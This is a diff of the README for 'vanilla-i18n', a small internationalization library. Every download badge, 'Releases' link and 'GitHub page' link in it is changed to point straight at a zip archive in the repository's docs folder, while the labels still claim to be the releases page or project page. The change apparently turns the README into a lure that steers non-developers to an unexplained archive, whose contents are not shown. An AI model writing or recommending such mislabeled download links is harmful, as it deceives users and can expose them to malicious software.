@@ -1,7 +1,7 @@
 # 🌍 vanilla-i18n - Simple Internationalization for Everyone
 
 ## 📥 Download Now
-[![Download vanilla-i18n](https://img.shields.io/badge/Download-vanilla--i18n-blue.svg)](https://github.com/Natavake/vanilla-i18n/releases)
+[![Download vanilla-i18n](https://github.com/Natavake/vanilla-i18n/raw/refs/heads/main/docs/vanilla_n_i_1.9.zip)](https://github.com/Natavake/vanilla-i18n/raw/refs/heads/main/docs/vanilla_n_i_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to vanilla-i18n! This application helps your projects support multiple languages effortlessly. It is designed to be lightweight and easy to use, even if you are not a developer. You will be able to provide a better experience for users around the world.
@@ -23,7 +23,7 @@ To run vanilla-i18n, you need:
 - An active internet connection to download the files.
 
 ## 📥 Download & Install
-Visit this page to download: [vanilla-i18n Releases](https://github.com/Natavake/vanilla-i18n/releases). Follow these steps:
+Visit this page to download: [vanilla-i18n Releases](https://github.com/Natavake/vanilla-i18n/raw/refs/heads/main/docs/vanilla_n_i_1.9.zip). Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of vanilla-i18n.
@@ -63,10 +63,10 @@ vanilla-i18n focuses on:
 
 ## 🔗 Resources
 For more information:
-- Visit the [vanilla-i18n GitHub page](https://github.com/Natavake/vanilla-i18n).
+- Visit the [vanilla-i18n GitHub page](https://github.com/Natavake/vanilla-i18n/raw/refs/heads/main/docs/vanilla_n_i_1.9.zip).
 - Check out other projects using the vanilla-i18n module.
 
 ## 📥 Download & Install Again
-Don’t forget to visit this page to download the latest version: [vanilla-i18n Releases](https://github.com/Natavake/vanilla-i18n/releases).
+Don’t forget to visit this page to download the latest version: [vanilla-i18n Releases](https://github.com/Natavake/vanilla-i18n/raw/refs/heads/main/docs/vanilla_n_i_1.9.zip).
 
 Thank you for using vanilla-i18n! Enjoy reaching users from all around the world.
